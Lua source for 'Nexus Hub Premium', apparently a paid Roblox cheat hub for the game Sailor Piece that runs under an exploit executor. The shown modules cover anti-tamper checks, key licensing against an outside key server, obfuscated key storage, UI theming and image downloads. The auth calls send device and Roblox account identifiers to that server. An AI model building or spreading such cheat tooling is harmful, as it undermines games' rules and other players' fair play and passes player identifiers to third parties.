
repeat
    task.wait()
until game:IsLoaded()
repeat
    task.wait()
until game.GameId ~= 0

local _NEXUS_PRODUCT = "NEXUS_HUB"
local _NEXUS_TIER = "PREMIUM"
local _NEXUS_AUTH_PRODUCT = "nexus_hub"
local _NEXUS_SCRIPT_ID = "nexus_hub_sailor_piece"
local _NEXUS_KEY_PORTAL_URL = "https://bnty.nexusdevs.fun/getkey?product=nexus_hub"
local _NEXUS_VERSION_URL = "https://keyserver.nexusdevs.fun/api/version/nexus_hub"
local _NEXUS_CLIENT_VERSION = "8.8"
local _NEXUS_SERVER_VERSION = "8.8.0"
local _NEXUS_PRODUCT_DISPLAY_NAME = "NEXUS HUB PREMIUM"
local _NEXUS_PRODUCT_HANDLE = "nexushub"
local _NEXUS_PRODUCT_INSTANCE = "NexusHubSailorPiecePremium"

local SailorAntiHook = (function()
local _xModule = {}

-- capturing the essential DONOT TOUCH! AT ALL!
local _v9Xr = type
local _kQ3m = pcall
local _jF8n = tostring
local _rW2s = rawget
local _pL5t = rawset
local _mN4v = error
local _bH7w = warn
local _cD6x = print
local _eG1y = select
local _fA9z = pairs
local _gB0a = ipairs 
local _hC3b = setmetatable
local _iE2c = getmetatable
local _aK8d = next
local _tR6e = unpack or table.unpack
local _uS5f = require
local _wU4g = tick
local _xV7h = task.spawn
local _yW8i = task.wait
local _zX9j = task.defer
local _qY0k = task.delay

-- String library
local _s1 = string.byte
local _s2 = string.char
local _s3 = string.sub
local _s4 = string.len
local _s5 = string.format
local _s6 = string.find
local _s7 = string.gsub
local _s8 = string.rep
local _s9 = string.lower
local _sA = string.upper
local _sB = string.match
local _sC = string.gmatch

-- Math library
local _m1 = math.random
local _m2 = math.floor
local _m3 = math.ceil
local _m4 = math.abs
local _m5 = math.max
local _m6 = math.min
local _m7 = math.huge

-- Table library
local _t1 = table.insert
local _t2 = table.remove
local _t3 = table.concat
local _t4 = table.sort
local _t5 = table.find
local _t6 = table.move
local _t7 = table.create

-- OS library
local _o1 = os.time
local _o2 = os.clock

-- Game services (captured once)
local _gHttp = game.HttpGet
local _gGetService = game.GetService
local _gLoadstring = loadstring
local _gGetgenv = getgenv
local _gSetclipboard = setclipboard
local _gWritefile = writefile
local _gReadfile = readfile
local _gIsfile = isfile
local _gDelfile = delfile
local _gFiresignal = firesignal

-- Network
local _gRequest = (syn and syn.request) or (http and http.request) or http_request or request

-- Core integrity: check captured refs are still functions
local function _dR7q()
    if _v9Xr(_gHttp) ~= "function" then return false end
    if _v9Xr(_gLoadstring) ~= "function" then return false end
    if _v9Xr(_gGetService) ~= "function" then return false end
    if _v9Xr(_kQ3m) ~= "function" then return false end
    if _v9Xr(_jF8n) ~= "function" then return false end
    if _v9Xr(_v9Xr) ~= "function" then return false end
    if _v9Xr(_xV7h) ~= "function" then return false end
    if _v9Xr(_gRequest) ~= "function" then return false end
    return true
end

-- Extended integrity: deeper checks
local function _eT4p()
    -- Verify string.byte hasn't been hooked to lie
    local testByte = _s1("A", 1)
    if testByte ~= 65 then return false end

    -- Verify math.floor works correctly
    local testFloor = _m2(3.7)
    if testFloor ~= 3 then return false end

    -- Verify pcall works
    local ok, _ = _kQ3m(function() return true end)
    if not ok then return false end

    return true
end

-- Full verification (both core + extended)
local function _fU5o()
    return _dR7q() and _eT4p()
end

-- Safe function execution with integrity check
local function _gV6n(fn, ...)
    if not _dR7q() then
        _mN4v("[Nexus] Environment compromised. Aborting execution.")
        return nil
    end
    return _kQ3m(fn, ...)
end

-- monitor
local _integrityAlive = true

local function _hW7m()
    _xV7h(function()
        while _integrityAlive do
            _yW8i(5)
            if not _fU5o() then
                _kQ3m(function()
                    local genv = _gGetgenv()
                    _pL5t(genv, "ShuttingDown", true)
                end)
                _mN4v("[Nexus] Hook detected during runtime. Terminated.")
                break
            end
        end
    end)
end

-- public api
_xModule.verify = _fU5o
_xModule.verifyCore = _dR7q
_xModule.verifyExtended = _eT4p
_xModule.safeCall = _gV6n
_xModule.startMonitor = _hW7m

-- Expose captured globals for other modules
_xModule.globals = {
    -- Core
    type = _v9Xr,
    pcall = _kQ3m,
    tostring = _jF8n,
    rawget = _rW2s,
    rawset = _pL5t,
    error = _mN4v,
    warn = _bH7w,
    print = _cD6x,
    select = _eG1y,
    pairs = _fA9z,
    ipairs = _gB0a,
    setmetatable = _hC3b,
    getmetatable = _iE2c,
    next = _aK8d,
    unpack = _tR6e,
    tick = _wU4g,

    -- Task
    spawn = _xV7h,
    wait = _yW8i,
    defer = _zX9j,
    delay = _qY0k,

    -- String
    str_byte = _s1,
    str_char = _s2,
    str_sub = _s3,
    str_len = _s4,
    str_format = _s5,
    str_find = _s6,
    str_gsub = _s7,
    str_rep = _s8,
    str_lower = _s9,
    str_upper = _sA,
    str_match = _sB,
    str_gmatch = _sC,

    -- Math
    math_random = _m1,
    math_floor = _m2,
    math_ceil = _m3,
    math_abs = _m4,
    math_max = _m5,
    math_min = _m6,
    math_huge = _m7,

    -- Table
    tbl_insert = _t1,
    tbl_remove = _t2,
    tbl_concat = _t3,
    tbl_sort = _t4,
    tbl_find = _t5,
    tbl_move = _t6,
    tbl_create = _t7,

    -- OS
    os_time = _o1,
    os_clock = _o2,

    -- Game
    HttpGet = _gHttp,
    GetService = _gGetService,
    loadstring = _gLoadstring,
    getgenv = _gGetgenv,
    setclipboard = _gSetclipboard,
    writefile = _gWritefile,
    readfile = _gReadfile,
    isfile = _gIsfile,
    delfile = _gDelfile,
    firesignal = _gFiresignal,
    request = _gRequest,
}

-- Stop the monitor (used during cleanup)
function _xModule.stopMonitor()
    _integrityAlive = false
end

return _xModule
-- make sure to replace the functions and hooks with the ones in your script whereever needed
end)()

-- Module: SailorUtils
local SailorUtils = (function()
--[[
    NexusPremium :: Shared Utilities v2.0
    HTTP, JSON, hashing, and helper functions.
    All use captured anti-hook globals.
]]

local Utils = {}
local G -- anti-hook globals, injected via init()

function Utils.init(antiHook)
    G = antiHook.globals
end

-- ============================================
-- HTTP
-- ============================================

function Utils.httpPost(url, body, headers)
    local HttpService = G.GetService(game, "HttpService")
    local ok, result = G.pcall(function()
        return G.request({
            Url = url,
            Method = "POST",
            Headers = headers or { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(body)
        })
    end)
    if ok and result then
        local decoded = nil
        local responseBody = result.Body or result.body or ""
        G.pcall(function()
            decoded = HttpService:JSONDecode(responseBody)
        end)
        return decoded, result.StatusCode or result.status_code or result.Status or 0
    end
    return nil, 0
end

function Utils.httpGet(url, headers)
    local ok, result = G.pcall(function()
        return G.request({
            Url = url,
            Method = "GET",
            Headers = headers or {}
        })
    end)
    if ok and result then
        local HttpService = G.GetService(game, "HttpService")
        local decoded = nil
        local responseBody = result.Body or result.body or ""
        G.pcall(function()
            decoded = HttpService:JSONDecode(responseBody)
        end)
        return decoded, result.StatusCode or result.status_code or result.Status or 0
    end
    return nil, 0
end

-- ============================================
-- JSON
-- ============================================

function Utils.jsonEncode(tbl)
    local HttpService = G.GetService(game, "HttpService")
    return HttpService:JSONEncode(tbl)
end

function Utils.jsonDecode(str)
    local HttpService = G.GetService(game, "HttpService")
    local ok, result = G.pcall(function()
        return HttpService:JSONDecode(str)
    end)
    if ok then return result end
    return nil
end

-- ============================================
-- SIGNATURE (DJB2 dual-hash, matches auth server)
-- ============================================

function Utils.computeSignature(key, ts, nc)
    local data = key .. ts .. nc
    local hash1 = 5381
    local hash2 = 5381
    for i = 1, G.str_len(data) do
        local c = G.str_byte(data, i)
        hash1 = (hash1 * 33 + c) % 4294967296
        hash2 = (hash2 * 65599 + c) % 4294967296
    end
    return G.str_sub(G.str_format("%08X%08X", hash1, hash2), 1, 16)
end

-- ============================================
-- HWID
-- ============================================

function Utils.getHWID()
    local hwid = "unknown"
    G.pcall(function()
        local RbxAnalytics = G.GetService(game, "RbxAnalyticsService")
        hwid = RbxAnalytics:GetClientId()
    end)
    return hwid
end

function Utils.getRobloxInfo()
    local info = nil
    G.pcall(function()
        local Players = G.GetService(game, "Players")
        local lp = Players.LocalPlayer
        if lp then
            info = {
                userId = G.tostring(lp.UserId),
                username = lp.Name or "",
                displayName = lp.DisplayName or "",
            }
        end
    end)
    return info
end

-- ============================================
-- GENERAL HELPERS
-- ============================================

function Utils.waitForChild(parent, name, timeout)
    timeout = timeout or 10
    local child = parent:FindFirstChild(name)
    if child then return child end
    local startTime = G.tick()
    while not child and (G.tick() - startTime) < timeout do
        G.wait(0.1)
        child = parent:FindFirstChild(name)
    end
    return child
end

function Utils.safeFireSignal(signal)
    G.pcall(function()
        G.firesignal(signal)
    end)
end

function Utils.generateNonce(length)
    length = length or 24
    local nonce = ""
    for i = 1, length do
        nonce = nonce .. G.str_format("%x", G.math_random(0, 15))
    end
    return nonce
end

function Utils.timestamp()
    return G.tostring(G.math_floor(G.os_time()))
end

-- Safe number formatting
function Utils.formatNumber(num)
    if num >= 1000000 then
        return G.str_format("%.1fM", num / 1000000)
    elseif num >= 1000 then
        return G.str_format("%.1fK", num / 1000)
    end
    return G.tostring(num)
end

-- Format seconds into h:m:s
function Utils.formatTime(seconds)
    seconds = G.math_floor(seconds)
    local hours = G.math_floor(seconds / 3600)
    local mins = G.math_floor((seconds % 3600) / 60)
    local secs = seconds % 60
    return G.str_format("%02d:%02d:%02d", hours, mins, secs)
end

return Utils
end)()

-- Module: SailorSaveKey
local SailorSaveKey = (function()
--[[
    NexusHub :: Save Key for SailorPiece.
    Stores tier-specific key payloads as XOR-obfuscated pak files.
]]

local SaveKey = {}
local G
local KEY_FILES = { 'Nexushub/configs/key.pak', 'nexusp/key.pak' }
local MAGIC = "NXP1"
local XOR_KEY = { 0x4E, 0x58, 0x50, 0x52, 0x45, 0x4D, 0x49, 0x55, 0x4D }

function SaveKey.init(antiHook)
    G = antiHook.globals
end

local function ensureFolders()
    G.pcall(function()
        if G.type(isfolder) ~= "function" or G.type(makefolder) ~= "function" then
            return
        end
        if not isfolder("Nexushub") then makefolder("Nexushub") end
        if not isfolder("Nexushub/configs") then makefolder("Nexushub/configs") end
        if not isfolder("nexusp") then makefolder("nexusp") end
        if not isfolder("nexusf") then makefolder("nexusf") end
    end)
end

local function xorData(data)
    local out = {}
    for i = 1, G.str_len(data) do
        local b = G.str_byte(data, i)
        local k = XOR_KEY[((i - 1) % #XOR_KEY) + 1]
        out[i] = G.str_char(bit32 and bit32.bxor(b, k) or ((b + k) % 256))
    end
    return G.tbl_concat(out)
end

local function checksum(data)
    local hash = 5381
    for i = 1, G.str_len(data) do
        hash = (hash * 33 + G.str_byte(data, i)) % 4294967296
    end
    return G.str_char(
        G.math_floor(hash / 16777216) % 256,
        G.math_floor(hash / 65536) % 256,
        G.math_floor(hash / 256) % 256,
        hash % 256
    )
end

function SaveKey.save(key)
    ensureFolders()
    local encrypted = xorData(key)
    local payload = MAGIC .. encrypted .. checksum(key)
    local saved = false
    for _, path in G.ipairs(KEY_FILES) do
        local ok = G.pcall(function()
            G.writefile(path, payload)
        end)
        saved = saved or ok
    end
    return saved
end

function SaveKey.load()
    for _, path in G.ipairs(KEY_FILES) do
        local loaded = nil
        G.pcall(function()
            if G.type(G.isfile) ~= "function" or G.type(G.readfile) ~= "function" then return end
            if not G.isfile(path) then return end
            local raw = G.readfile(path)
            if not raw or G.str_len(raw) < 8 then return end
            if G.str_sub(raw, 1, 4) ~= MAGIC then return end
            local encrypted = G.str_sub(raw, 5, G.str_len(raw) - 4)
            local storedChecksum = G.str_sub(raw, G.str_len(raw) - 3, G.str_len(raw))
            local decrypted = xorData(encrypted)
            if checksum(decrypted) ~= storedChecksum then return end
            decrypted = G.str_gsub(decrypted, "^%s+", "")
            decrypted = G.str_gsub(decrypted, "%s+$", "")
            if decrypted ~= "" then
                loaded = decrypted
            end
        end)
        if loaded then
            return loaded
        end
    end
    return nil
end

function SaveKey.clear()
    for _, path in G.ipairs(KEY_FILES) do
        G.pcall(function()
            if G.type(G.isfile) == "function" and G.type(G.delfile) == "function" and G.isfile(path) then
                G.delfile(path)
            end
        end)
    end
end

function SaveKey.exists()
    return SaveKey.load() ~= nil
end

return SaveKey
end)()

-- Module: SailorAuth
local SailorAuth = (function()
--[[
    NexusHub :: Auth System v2.2
    Premium key validation against NexusAuth API.
    Uses /heartbeat for lightweight re-validation.
    Production-only flow: no active auth bypass path.
]]

local Auth = {}
local G
local Utils
local SaveKey
local AntiHook

local AUTH_BASE_URL = "https://keyserver.nexusdevs.fun/api/auth"
local AUTH_CLIENT_PRODUCT = "nexus_hub"
local AUTH_SCRIPT_ID = "nexus_hub_sailor_piece"
local AUTH_VALIDATE_URL = "https://keyserver.nexusdevs.fun/api/auth/validate"
local AUTH_HEARTBEAT_URL = "https://keyserver.nexusdevs.fun/api/auth/heartbeat"
local CLIENT_VERSION = "8.7"
if CLIENT_VERSION:sub(1, 1) == "%" then
    CLIENT_VERSION = "8.6"
end
local INITIAL_REVALIDATION_DELAY = 30
local REVALIDATION_INTERVAL = 300
local MAX_RETRIES = 5
local RETRY_DELAY = 1.5
local HEARTBEAT_RETRIES = 2
local REVALIDATION_VALIDATE_RETRIES = 2
local MAX_REVALIDATION_FAILURES = 3

local _validated = false
local _keyData = nil
local _keyHash = nil
local _activeKey = nil
local _runtimeToken = nil
local _runtimeExpiresAt = 0
local _revalidateAlive = false
local _failCount = 0

function Auth.init(antiHook, utilsModule, saveKeyModule)
    G = antiHook.globals
    AntiHook = antiHook
    Utils = utilsModule
    SaveKey = saveKeyModule
end

local function getRetryDelay(attempt)
    return math.min(RETRY_DELAY * attempt, 4)
end

local function maskKey(key)
    if not key or #key <= 13 then
        return key
    end
    return G.str_sub(key, 1, 9) .. "****-****-****-****-" .. G.str_sub(key, -4)
end

local function performValidateRequest(key, maxAttempts)
    local response, statusCode = nil, nil
    local attempts = maxAttempts or MAX_RETRIES
    local hwid = Utils.getHWID()
    local ts = Utils.timestamp()
    local nonce = Utils.generateNonce(24)
    local signature = Utils.computeSignature(key, ts, nonce)
    local account = Utils.getRobloxInfo()

    for attempt = 1, attempts do
        local headers = nil
        if AUTH_CLIENT_PRODUCT == "ui_v2" or AUTH_CLIENT_PRODUCT == "nexus_hub" then
            headers = {
                ["Content-Type"] = "application/json",
                ["X-Nexus-UI-Key"] = key,
                ["X-Api-Key"] = key,
            }
        end

        response, statusCode = Utils.httpPost(AUTH_VALIDATE_URL, {
            key = key,
            hwid = hwid,
            instance_id = game.JobId,
            client_version = CLIENT_VERSION,
            client_product = AUTH_CLIENT_PRODUCT,
            script_id = AUTH_SCRIPT_ID,
            place_id = game.PlaceId,
            game_id = game.GameId,
            roblox_user_id = account and account.userId or nil,
            roblox_username = account and account.username or nil,
            timestamp = ts,
            nonce = nonce,
            signature = signature,
        }, headers)

        if response then
            break
        end

        if attempt < attempts then
            G.wait(getRetryDelay(attempt))
            hwid = Utils.getHWID()
            account = Utils.getRobloxInfo()
            ts = Utils.timestamp()
            nonce = Utils.generateNonce(24)
            signature = Utils.computeSignature(key, ts, nonce)
        end
    end

    return response, statusCode
end

local function performHeartbeatRequest()
    if not _keyHash or AUTH_HEARTBEAT_URL == "" or not _runtimeToken then
        return nil, nil
    end

    local response = nil
    for attempt = 1, HEARTBEAT_RETRIES do
        local account = Utils.getRobloxInfo()
        local headers = {
            ["Content-Type"] = "application/json",
            ["Authorization"] = "Bearer " .. _runtimeToken,
        }
        if _activeKey and (AUTH_CLIENT_PRODUCT == "ui_v2" or AUTH_CLIENT_PRODUCT == "nexus_hub") then
            headers["X-Nexus-UI-Key"] = _activeKey
            headers["X-Api-Key"] = _activeKey
        end

        response = select(1, Utils.httpPost(AUTH_HEARTBEAT_URL, {
            key_hash = _keyHash,
            hwid = Utils.getHWID(),
            instance_id = game.JobId,
            client_version = CLIENT_VERSION,
            client_product = AUTH_CLIENT_PRODUCT,
            script_id = AUTH_SCRIPT_ID,
            place_id = game.PlaceId,
            game_id = game.GameId,
            roblox_user_id = account and account.userId or nil,
            roblox_username = account and account.username or nil,
            roblox_display_name = account and account.displayName or nil,
            runtime_token = _runtimeToken,
        }, headers))

        if response then
            break
        end

        if attempt < HEARTBEAT_RETRIES then
            G.wait(getRetryDelay(attempt))
        end
    end

    return response
end

local function markRevalidationFailure()
    _failCount = _failCount + 1
    if _failCount >= MAX_REVALIDATION_FAILURES then
        _validated = false
        G.rawset(G.getgenv(), "ShuttingDown", true)
        return true
    end
    return false
end

function Auth.validate(key)
    if not AntiHook.verify() then
        G.error("[Nexus] Environment compromised before auth. Aborting.")
        return false, "Environment tampered"
    end

    if not key or key == "" then
        G.warn("[NexusHub] No key provided!")
        return false, "No key provided"
    end

    local response, statusCode = performValidateRequest(key, MAX_RETRIES)

    if not AntiHook.verify() then
        return false, "Environment tampered"
    end

    if not response then
        return false, "Failed to reach auth server after " .. MAX_RETRIES .. " attempts"
    end

    if response.status == "valid" then
        if not response.runtime_token or not response.runtime_expires_at then
            SaveKey.clear()
            return false, "Server response missing runtime proof"
        end

        _validated = true
        _activeKey = key
        _keyHash = response.key_hash or _keyHash
        _runtimeToken = response.runtime_token
        _runtimeExpiresAt = response.runtime_expires_at or 0
        _failCount = 0
        _keyData = {
            expiresIn = response.expires_in or 0,
            keyType = response.key_type or "premium",
            isPremium = response.is_premium,
            isFarmer = response.is_farmer,
            discordLinked = response.discord_linked,
            runtimeExpiresAt = _runtimeExpiresAt,
            validated = true,
            validatedAt = G.tick(),
        }

        G.rawset(G.getgenv(), "NexusHub", {
            validated = true,
            keyType = _keyData.keyType,
            expiresIn = _keyData.expiresIn,
            isPremium = _keyData.isPremium,
            isFarmer = _keyData.isFarmer,
            runtimeExpiresAt = _runtimeExpiresAt,
        })

        SaveKey.save(key)
        return true, nil
    end

    local msg = response.message or "Unknown error"
    local status = response.status or "unknown"

    if status == "expired" then
        SaveKey.clear()
    elseif status == "blacklisted" or response.code == "KEY_BLACKLISTED" then
        SaveKey.clear()
    elseif status == "hwid_mismatch" then
    elseif status == "not_linked" then
    elseif status == "banned" then
        SaveKey.clear()
    elseif status == "revoked" then
        SaveKey.clear()
    elseif status == "invalid" then
        SaveKey.clear()
    end

    return false, msg
end

function Auth.startRevalidation(key)
    if _revalidateAlive then
        return
    end

    _revalidateAlive = true
    G.spawn(function()
        local nextDelay = INITIAL_REVALIDATION_DELAY

        while _revalidateAlive and not G.rawget(G.getgenv(), "ShuttingDown") do
            G.wait(nextDelay)
            if not _revalidateAlive then
                break
            end
            nextDelay = REVALIDATION_INTERVAL

            local response = performHeartbeatRequest()
            if not response or response.status ~= "valid" then
                response = select(1, performValidateRequest(key, REVALIDATION_VALIDATE_RETRIES))
            end

            if response and response.status == "valid" then
                if not response.runtime_token or not response.runtime_expires_at then
                    _validated = false
                    G.rawset(G.getgenv(), "ShuttingDown", true)
                    break
                end
                _validated = true
                _failCount = 0
                _keyHash = response.key_hash or _keyHash
                _runtimeToken = response.runtime_token
                _runtimeExpiresAt = response.runtime_expires_at or _runtimeExpiresAt
                if _keyData then
                    if response.expires_in then
                        _keyData.expiresIn = response.expires_in
                    end
                    _keyData.runtimeExpiresAt = _runtimeExpiresAt
                    _keyData.validated = true
                    _keyData.validatedAt = G.tick()
                end
            else
                if response then
                    _validated = false
                    G.rawset(G.getgenv(), "ShuttingDown", true)
                    break
                end
                if markRevalidationFailure() then
                    break
                end
            end
        end
    end)
end

function Auth.isValidated()
    return _validated
end

function Auth.getKeyData()
    return _keyData
end

function Auth.getKeyHash()
    return _keyHash
end

function Auth.getRuntimeToken()
    return _runtimeToken
end

function Auth.getRuntimeExpiresAt()
    return _runtimeExpiresAt
end

function Auth.stop()
    _revalidateAlive = false
    _runtimeToken = nil
    _runtimeExpiresAt = 0
end

return Auth
end)()

-- Module: SailorTheme
local SailorTheme = (function()
--[[
    NexusPremium :: Theme v6.0 — Night Grey (Mobile-Friendly Rounded)
    Clean rounded styling, no particles/overlays.
]]

local Theme = {}

-- Night Grey Palette
Theme.Colors = {
    BgPrimary     = Color3.fromRGB(18, 18, 24),
    BgSidebar     = Color3.fromRGB(22, 22, 30),
    BgContent     = Color3.fromRGB(20, 20, 26),
    BgCard        = Color3.fromRGB(30, 30, 38),
    BgInput       = Color3.fromRGB(26, 26, 34),
    BgHover       = Color3.fromRGB(38, 38, 48),
    BgActive      = Color3.fromRGB(34, 34, 44),
    BgTertiary    = Color3.fromRGB(36, 36, 46),

    AccentCyan    = Color3.fromRGB(0, 200, 210),
    AccentPurple  = Color3.fromRGB(138, 92, 246),
    AccentRed     = Color3.fromRGB(239, 68, 68),
    AccentGreen   = Color3.fromRGB(52, 211, 153),
    AccentGold    = Color3.fromRGB(251, 191, 36),
    AccentBlue    = Color3.fromRGB(59, 130, 246),
    AccentOrange  = Color3.fromRGB(251, 146, 60),

    TextPrimary   = Color3.fromRGB(225, 225, 232),
    TextSecondary = Color3.fromRGB(150, 150, 165),
    TextMuted     = Color3.fromRGB(90, 90, 105),
    TextGlow      = Color3.fromRGB(180, 235, 255),

    Border        = Color3.fromRGB(45, 45, 56),
    BorderLight   = Color3.fromRGB(58, 58, 70),

    GlowCyan      = Color3.fromRGB(0, 140, 160),
    White         = Color3.fromRGB(255, 255, 255),
}

Theme.Alpha = {
    Glass = 0.15,
    Card  = 0.08,
}

-- Rounded radii for mobile-friendly look
Theme.Radius = {
    None = 0,
    XS   = 4,
    SM   = 8,
    MD   = 12,
    LG   = 16,
    XL   = 20,
    XXL  = 24,
    Pill = 100,
}

Theme.Fonts = {
    Title    = Enum.Font.GothamBlack,
    Subtitle = Enum.Font.GothamBold,
    Body     = Enum.Font.GothamBold,
    Button   = Enum.Font.GothamBold,
    Mono     = Enum.Font.Code,
}

Theme.TextSize = {
    Hero    = 28,
    XLarge  = 22,
    Large   = 18,
    Medium  = 15,
    Small   = 14,
    XSmall  = 13,
    Micro   = 11,
    Counter = 24,
}

Theme.Tween = {} -- populated at runtime

function Theme.initTweens()
    Theme.Tween = {
        Fast    = TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        Normal  = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        Smooth  = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
        Bounce  = TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        Spring  = TweenInfo.new(0.3, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out),
        Breathe = TweenInfo.new(2.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        Pulse   = TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        Snap    = TweenInfo.new(0.06),
    }
end

Theme.initTweens()

-- ============================================
-- UTILITY FUNCTIONS
-- ============================================

function Theme.corner(inst, radius)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, radius or Theme.Radius.SM)
    c.Parent = inst
    return c
end

function Theme.stroke(inst, color, thickness, transparency)
    local s = Instance.new("UIStroke")
    s.Color = color or Theme.Colors.Border
    s.Thickness = thickness or 1
    s.Transparency = transparency or 0.5
    s.Parent = inst
    return s
end

function Theme.padding(inst, top, right, bottom, left)
    local p = Instance.new("UIPadding")
    p.PaddingTop = UDim.new(0, top or 0)
    p.PaddingRight = UDim.new(0, right or top or 0)
    p.PaddingBottom = UDim.new(0, bottom or top or 0)
    p.PaddingLeft = UDim.new(0, left or right or top or 0)
    p.Parent = inst
    return p
end

function Theme.gradient(inst, c1, c2, rotation)
    local g = Instance.new("UIGradient")
    g.Color = ColorSequence.new(c1, c2)
    g.Rotation = rotation or 0
    g.Parent = inst
    return g
end

function Theme.neonGlow(inst, color, transparency)
    local s = Instance.new("UIStroke")
    s.Color = color or Theme.Colors.GlowCyan
    s.Thickness = 1.5
    s.Transparency = transparency or 0.6
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = inst
    return s
end

-- Stub functions for backward compat (no particles in Night Grey)
function Theme.createParticles() return {} end
function Theme.animateParticles() end
function Theme.createGeometricOverlay() end

-- Click feedback effect — scale press + brighten
function Theme.clickEffect(btn)
    if not btn or not btn:IsA("GuiButton") then return end
    local origSize = btn.Size
    btn.MouseButton1Down:Connect(function()
        local ts = game:GetService("TweenService")
        ts:Create(btn, Theme.Tween.Snap, {
            Size = UDim2.new(origSize.X.Scale * 0.95, math.floor(origSize.X.Offset * 0.95), origSize.Y.Scale * 0.95, math.floor(origSize.Y.Offset * 0.95)),
        }):Play()
    end)
    btn.MouseButton1Up:Connect(function()
        local ts = game:GetService("TweenService")
        ts:Create(btn, Theme.Tween.Bounce, {
            Size = origSize,
        }):Play()
    end)
    btn.MouseLeave:Connect(function()
        local ts = game:GetService("TweenService")
        ts:Create(btn, Theme.Tween.Fast, {
            Size = origSize,
        }):Play()
    end)
end

return Theme
end)()

-- Module: SailorAssets
local SailorAssets = (function()
--[[
    NexusPremium :: Asset Loader v2.0
    Streams images from HTTP URLs (PNG/WEBP/SVG).
    Downloads → writefile → getcustomasset → ImageLabel.
    Caches locally to avoid re-downloading.
    
    Usage:
        Assets.load("logo", callback)
        Assets.applyImage(imageLabel, "logo")
]]

local Assets = {}
local G

local _cache = {}     -- id -> resolved asset path
local _loading = {}   -- id -> true
local _callbacks = {} -- id -> {fn, ...}
local _assetDir = "nexus_assets/"

-- ============================================
-- ASSET MANIFEST — HTTP URLs
-- ============================================

Assets.Manifest = {
    -- Main banner (behind main GUI window)
    banner_main = "https://raw.githubusercontent.com/Ryu-Dev-here/assetsfora/main/bg-some.png",
    
    -- Full background image
    background_full = "https://raw.githubusercontent.com/Ryu-Dev-here/assetsfora/main/opbg.png",
    
    -- Logo (actual image from GitHub)
    logo        = "https://raw.githubusercontent.com/ryudacatt/assetsfora/main/logo.png",
    
    -- Auth screen banner (with white bg behind for best visuals)
    banner_auth = "https://raw.githubusercontent.com/Ryu-Dev-here/assetsfora/main/image12.png",

    -- GFX Kill overlay (shown on kill when GFX Killer is ON)
    gfx_kill = "https://raw.githubusercontent.com/Ryu-Dev-here/assetsfora/main/bg1.png",
}

-- ============================================
-- EXECUTOR API DETECTION
-- ============================================

local _httpGet = nil
local _writeFile = nil
local _readFile = nil
local _isFile = nil
local _makeFolder = nil
local _isFolder = nil
local _customAsset = nil

local function detectAPIs()
    -- HTTP request
    _httpGet = (type(request) == "function" and request)
        or (type(http_request) == "function" and http_request)
        or (type(syn) == "table" and syn.request)
        or (type(http) == "table" and http.request)
        or nil
    
    -- File system
    _writeFile = (type(writefile) == "function" and writefile) or nil
    _readFile = (type(readfile) == "function" and readfile) or nil
    _isFile = (type(isfile) == "function" and isfile) or nil
    _makeFolder = (type(makefolder) == "function" and makefolder) or nil
    _isFolder = (type(isfolder) == "function" and isfolder) or nil
    
    -- Custom asset (converts local file to usable Image)
    _customAsset = (type(getcustomasset) == "function" and getcustomasset)
        or (type(getsynasset) == "function" and getsynasset)
        or nil
end

-- ============================================
-- INIT
-- ============================================

function Assets.init(antiHook)
    G = antiHook.globals
    detectAPIs()
    
    -- Create asset directory
    if _makeFolder and _isFolder then
        G.pcall(function()
            if not _isFolder(_assetDir) then
                _makeFolder(_assetDir)
            end
        end)
    end
    if _writeFile and _isFile then
        G.pcall(function()
            if not _isFile(_assetDir .. ".init") then
                _writeFile(_assetDir .. ".init", "1")
            end
        end)
    end
end

-- ============================================
-- DOWNLOAD + CACHE (HTTP → file → customasset)
-- ============================================

local function resolveAsset(id, resolvedAsset, callback)
    _cache[id] = resolvedAsset
    _loading[id] = false

    if callback then
        G.pcall(callback, resolvedAsset)
    end

    if _callbacks[id] then
        for _, cb in ipairs(_callbacks[id]) do
            G.pcall(cb, resolvedAsset)
        end
        _callbacks[id] = nil
    end
end

local function downloadAsset(id, url, callback)
    if not _httpGet or not _writeFile or not _customAsset then
        -- Fallback: try using URL directly (some executors support it)
        resolveAsset(id, url, callback)
        return
    end
    
    local fileName = _assetDir .. id .. Assets._getExtension(url)
    
    -- Check if already downloaded
    if _isFile and _isFile(fileName) then
        local ok, asset = G.pcall(function()
            return _customAsset(fileName)
        end)
        if ok and asset then
            resolveAsset(id, asset, callback)
            return
        end
    end
    
    -- Download from URL
    G.spawn(function()
        local ok, result = G.pcall(function()
            local response = _httpGet({
                Url = url,
                Method = "GET",
            })
            
            if response and response.StatusCode == 200 and response.Body then
                _writeFile(fileName, response.Body)
                local asset = _customAsset(fileName)
                _cache[id] = asset
                return asset
            end
            return nil
        end)
        
        if ok and result then
            resolveAsset(id, result, callback)
        else
            -- Fallback to raw URL
            resolveAsset(id, url, callback)
        end
    end)
end

-- ============================================
-- EXTENSION HELPER
-- ============================================

function Assets._getExtension(url)
    local ext = url:match("%.(%w+)$")
    if ext then
        ext = ext:lower()
        if ext == "png" or ext == "jpg" or ext == "jpeg" or ext == "webp" or ext == "svg" then
            return "." .. ext
        end
    end
    return ".png"
end

-- ============================================
-- LOAD (async with callback)
-- ============================================

function Assets.load(id, callback)
    if _cache[id] then
        if callback then G.pcall(callback, _cache[id]) end
        return
    end
    
    if callback then
        if not _callbacks[id] then _callbacks[id] = {} end
        table.insert(_callbacks[id], callback)
    end
    
    if _loading[id] then return end
    _loading[id] = true
    
    local url = Assets.Manifest[id]
    if url then
        downloadAsset(id, url, nil)
    end
end

-- ============================================
-- GET (sync — returns cached or nil)
-- ============================================

function Assets.get(id)
    return _cache[id]
end

-- ============================================
-- APPLY TO IMAGE LABEL
-- ============================================

function Assets.applyImage(imageLabel, assetId)
    if not imageLabel then return end
    
    local cached = _cache[assetId]
    if cached then
        imageLabel.Image = cached
        return
    end
    
    -- Load async and apply when ready
    Assets.load(assetId, function(resolvedAsset)
        if imageLabel and imageLabel.Parent then
            imageLabel.Image = resolvedAsset
        end
    end)
end

